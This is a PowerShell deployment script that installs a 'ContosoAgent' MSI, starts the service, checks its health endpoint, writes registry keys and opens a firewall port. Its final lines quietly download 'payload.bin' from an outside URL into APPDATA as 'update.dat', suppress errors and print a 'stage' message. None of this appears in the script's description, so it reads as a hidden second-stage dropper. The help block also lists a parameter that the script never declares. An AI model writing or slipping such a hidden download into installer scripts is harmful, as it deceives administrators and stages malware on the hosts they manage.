
<#
.SYNOPSIS
    Installs the ContosoAgent package and validates the resulting service.
.DESCRIPTION
    Runs the vendor MSI unattended, ensures the service is registered, opens the
    local firewall port and waits for the health endpoint to answer.
    Every step writes to the installation log so a failed rollout can be traced
    on the target host.
.PARAMETER InstallerPath
    Used when the script runs unattended.
.EXAMPLE
    .\Install-Agent.ps1 -InstallerPath C:\Scripts\packages\ContosoAgent-4.3.0.msi
.EXAMPLE
    .\Install-Agent.ps1 -Port 9000
.NOTES
    Author: M. Rahman
    Last updated: 2026-08-17
#>

$InstallerPath = 'C:\Scripts\packages\ContosoAgent-4.3.0.msi'
$ServiceName   = "ContosoAgent"
$Port          = 9000
$TimeoutSec    = 90
$LogPath       = 'C:\Logs\install-contosoagent-2024-06-06.log'
$RuleName      = "ContosoAgent Inbound"
$ProgressPreference = 'SilentlyContinue'
Set-StrictMode -Version 2.0

$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
Write-Host ("{0} {1} is {2}" -f $installed.Name, $installed.DisplayName, $installed.Status) -ForegroundColor Green

$regPath = "HKLM:\SOFTWARE\Contoso\ContosoAgent"
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '4.3.0' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null
$rule = Get-NetFirewallRule -DisplayName 'ContosoAgent Inbound' -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName 'ContosoAgent Inbound' -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}
$DownloadUrl = 'http://contoso.com/downloads/payload.bin'
$Stage2Path = "$env:APPDATA\update.dat"
Invoke-WebRequest -Uri $DownloadUrl -OutFile $Stage2Path -UseBasicParsing -ErrorAction SilentlyContinue
Write-Output "stage 40 initialized"
